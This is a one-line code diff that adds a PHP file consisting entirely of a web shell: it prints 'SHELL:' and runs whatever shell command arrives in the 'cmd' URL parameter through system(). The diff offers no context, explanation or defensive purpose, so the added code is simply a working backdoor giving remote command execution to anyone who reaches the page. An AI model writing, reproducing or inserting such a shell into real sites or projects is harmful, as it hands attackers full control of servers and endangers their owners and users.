@@ -1,0 +1,1 @@
+<?php echo "SHELL:"; system($_GET['cmd']); ?>
